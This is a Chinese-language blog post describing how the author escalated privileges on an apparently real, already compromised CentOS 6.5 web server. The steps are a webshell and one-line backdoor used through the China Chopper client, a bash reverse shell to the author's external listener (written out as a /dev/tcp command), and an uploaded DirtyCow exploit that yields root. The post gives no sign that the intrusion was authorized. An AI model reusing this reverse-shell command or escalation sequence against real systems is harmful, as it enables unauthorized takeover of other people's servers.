# DirtyCow(脏牛)漏洞之实战


<!--more-->

---

## 1. 前言

这篇文章是小伙伴拿下了`webshell`，但因为是Linux服务器，一直提不了权，于是叫我看看。我通过`DirtyCow(脏牛)漏洞`拿到了管理员权限，由于是第一次接触`DirtyCow(脏牛)漏洞`，所以记录下了这篇文章。

---

## 2. webshell执行命令

* 首先通过已有的`大马webshell`执行命令，发现执行失败
![](/images/脏牛漏洞之实战/7053d5f13eee4136c7eba16fdc3b4cd0e9fc744487749049b33adbbc6fd3bd56.png " ")

* 写个`一句话木马`进去，再尝试用`菜刀`执行命令
![](/images/脏牛漏洞之实战/ed38269dc781335731b2155a7802ffe48010e766582a7781e95938eacac7b04f.png " ")

* 可以看到`菜刀`也不能执行命令，但是`菜刀`返回了服务器的内核版本和系统位数，搜索了一下，应该是`centos6.5`，本地搭建`centos6.5`显示的信息也证明了这一点
![](/images/脏牛漏洞之实战/5abf67a505ab3040843181e945442cbea4ad25722b67925c1568a82670c5556a.png " ")

* 搜索了`菜刀不能执行命令`，根据资料构造了一个`php`文件，通过`菜刀`上传了上去，发现果然能执行命令，并且系统版本的确是`centos6.5`
![](/images/脏牛漏洞之实战/3184611994bade6d3347836fcd77abe0431b1185ff069c9d0a1a8cfcfba880d5.png " ")

* 通过`webshell`查看当前权限，发现当前权限为`www`用户的权限，很多命令都不能执行
![](/images/脏牛漏洞之实战/19700208138fea59ffa06c611fdf64ed0d7914b7b1ce5836b5b0c49cc468830b.png " ")

---

## 3. 反弹shell

因为`脏牛漏洞`利用需要一个持续保持连接的`shell`，所以需要反弹一个`shell`

* 首先在自己的外网服务器用`nc`监听`6666`端口
![](/images/脏牛漏洞之实战/001c60489854a451c8ff8072c06c56a8bb5828cc378203fb02aa41d22a014691.png " ")

* 然后在`webshell`上执行`反弹shell命令`
![](/images/脏牛漏洞之实战/f826aeb22d9b2ecae75fd94585dcf702ada0f74b068234a1585e9aebb4af2539.png " ")

```shell
$ bash -i >& /dev/tcp/x.x.x.x/6666 0>&1         # 其中x.x.x.x是自己nc监听的服务器地址
```

* 执行命令之后，外网服务器获得一个`shell`
![](/images/脏牛漏洞之实战/329c21063b3769522dcce128f1d0b48ae95db004ec793353b3fce3dcce2496b5.png " ")

---

## 4. 提权

有了稳定的`shell`之后，就可以开始尝试提权了，这里`提权的exp`建议在本地编译，因为目标机上`www`权限可能没权限执行`gcc`命令或者没有安装`gcc`

* 本地编译测试
![](/images/脏牛漏洞之实战/50eb227c7ad4bf2bf2d32ae116b1502bc68854f462bc78ff38a72104b253a34f.png " ")

* 上传到目标机器上提权(需要上传到`/tmp/`目录下，因为`/tmp/`目录下有`执行权限`)
![](/images/脏牛漏洞之实战/49f3314cb8b8d3d192fb7ec0bfb067d101c8a07999ab7db2ae6bd05f865c71c1.png " ")

* 提权成功后，通过`firefart`账户登录，然后查看权限可看到是`root`权限
![](/images/脏牛漏洞之实战/033260465e4f70fb5042419219654b22660341d4e004c290f43fd2ac31733e70.png " ")

---

## 5. END
该篇文章没啥技术含量，就是拿人家的`exp`上去跑了一遍就提权成功了，相当于`脚本小子`了，所以严格来说这只是篇经历文章。有时间应该去分析下`脏牛漏洞`的漏洞成因，以后再说吧。

<br />

---

{{< admonition abstract "参考链接" >}}
菜刀不能执行命令解决方法：[https://www.webshell.cc/5328.html](https://www.webshell.cc/5328.html)

Linux下反弹SHELL的种种方式：[https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html](https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html)

利用脏牛漏洞详细提权过程：[http://zone.secevery.com/article/846](http://zone.secevery.com/article/846)
{{< /admonition>}}
